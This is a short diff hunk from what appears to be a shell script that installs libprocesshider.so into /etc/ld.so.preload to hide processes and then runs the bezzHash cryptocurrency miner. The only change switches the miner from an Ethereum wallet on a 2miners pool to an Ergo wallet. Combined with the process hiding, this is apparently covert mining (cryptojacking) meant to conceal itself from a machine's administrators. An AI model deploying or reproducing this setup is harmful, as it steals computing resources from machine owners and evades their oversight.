@@ -41,4 +41,4 @@ mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 #./graftcp/graftcp 
-./bezzHash --url=0x52c826fb4807755c288b41f0004b0ed0873f6bb5@solo-eth.2miners.com:6060 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./bezzHash --url=9gL1cBifCAEzDjKd9ov5sHpWbxSt2jqAiHhVrXPxhWc6B6zfW7G@solo-erg.2miners.com:9999 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
